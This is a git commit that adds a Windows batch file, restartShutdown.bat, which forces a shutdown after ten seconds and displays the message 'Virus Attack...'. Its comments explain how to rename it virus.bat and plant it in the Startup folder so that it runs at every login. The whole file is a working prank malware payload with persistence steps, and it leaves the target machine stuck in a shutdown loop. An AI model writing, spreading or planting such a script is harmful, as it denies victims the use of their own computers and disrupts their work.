1106de04329d523de2b8434d204a65d2c3705e53
Ranjit <known1995ranjit@yahoo.com>
2017-05-17 12:42:47 +0530

    Create restartShutdown.bat

---
+++ racker/vbs bat/restartShutdown.bat
@@ -0,0 +1,18 @@
+@ECHO OFF
+
+shutdown -s -t 10 -c "Virus Attack..."
+
+exit
+
+
+rem ? File >> Save As...
+
+rem ? Name it : virus.bat
+
+rem ? Start >> All Programs
+
+rem ? Right Click on Startup >> Open
+
+rem ? This open the Startup folder
+
+rem ? Paste the Virus.bat file here !
